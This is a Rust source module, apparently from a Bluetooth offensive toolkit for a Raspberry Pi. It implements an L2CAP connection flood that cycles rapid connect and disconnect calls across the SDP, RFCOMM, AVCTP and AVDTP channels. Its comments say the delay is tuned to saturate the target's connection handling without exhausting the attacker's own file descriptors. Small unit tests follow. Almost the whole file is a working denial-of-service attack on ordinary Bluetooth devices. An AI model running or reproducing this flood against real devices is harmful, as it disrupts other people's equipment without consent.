//! L2CAP connection flood: rapid connect/disconnect cycle across multiple PSMs.
//!
//! Opens L2CAP connections to common PSMs (SDP, RFCOMM, AVCTP, AVDTP) in
//! a tight loop, immediately dropping each after connect.  The goal is to
//! exhaust the target's L2CAP connection table and stress its connection
//! handling state machine.

use std::time::{Duration, Instant};

use super::l2cap_socket::L2capSocket;
use super::{BtAttackResult, BtAttackType};

/// Common classic BR/EDR PSMs to cycle through.
const PSMS: &[(u16, &str)] = &[
    (1, "SDP"),
    (3, "RFCOMM"),
    (23, "AVCTP"),
    (25, "AVDTP"),
];

/// Run an L2CAP connection flood against `target_addr` for `duration_secs`.
///
/// Each iteration opens a socket to one of the target PSMs and immediately
/// drops it (kernel sends L2CAP Disconnect), cycling through PSMs round-robin.
/// A short delay between connections prevents the Pi's own kernel from
/// running out of file descriptors.
pub fn run(target_addr: &str, addr_type: u8, duration_secs: u64) -> BtAttackResult {
    let start = Instant::now();
    let deadline = start + Duration::from_secs(duration_secs);
    let mut connections: u64 = 0;
    let mut errors: u64 = 0;
    let mut last_error: Option<String> = None;

    log::info!(
        "l2cap_conn_flood: targeting {} for {}s across {} PSMs",
        target_addr,
        duration_secs,
        PSMS.len(),
    );

    while Instant::now() < deadline {
        let (psm, psm_name) = PSMS[connections as usize % PSMS.len()];

        match L2capSocket::connect(target_addr, addr_type, psm, 0) {
            Ok(_sock) => {
                // Socket dropped immediately — kernel sends L2CAP Disconnect.
                connections += 1;
                if connections % 50 == 0 {
                    log::debug!(
                        "l2cap_conn_flood: {} connections so far ({:.1}s elapsed)",
                        connections,
                        start.elapsed().as_secs_f32(),
                    );
                }
            }
            Err(e) => {
                errors += 1;
                last_error = Some(format!("PSM {} ({}): {}", psm, psm_name, e));
                // If the target is refusing everything, back off briefly.
                if errors > 10 && connections == 0 {
                    log::warn!(
                        "l2cap_conn_flood: {} straight errors, target unreachable — aborting",
                        errors,
                    );
                    break;
                }
            }
        }

        // 10ms inter-connection delay — fast enough to saturate the target's
        // L2CAP handler but won't exhaust our own fd table.
        std::thread::sleep(Duration::from_millis(10));
    }

    let elapsed = start.elapsed();
    log::info!(
        "l2cap_conn_flood: done — {} connects, {} errors in {:.1}s",
        connections,
        errors,
        elapsed.as_secs_f32(),
    );

    BtAttackResult {
        attack_type: BtAttackType::L2capConnFlood,
        target_address: target_addr.to_string(),
        target_name: None,
        success: connections > 0,
        capture: None,
        error: last_error,
        detail: Some(format!("{} connects, {} errors in {:.0}s", connections, errors, elapsed.as_secs_f32())),
        timestamp: start,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_psms_not_empty() {
        assert!(!PSMS.is_empty());
        for &(psm, name) in PSMS {
            assert!(psm > 0);
            assert!(!name.is_empty());
        }
    }

    #[cfg(not(target_os = "linux"))]
    #[test]
    fn test_run_stub() {
        // On stub platform, connect always succeeds, so we get connections.
        let result = run("AA:BB:CC:DD:EE:FF", 0, 1);
        assert_eq!(result.attack_type, BtAttackType::L2capConnFlood);
        assert!(result.success);
        assert!(result.error.is_none());
    }
}
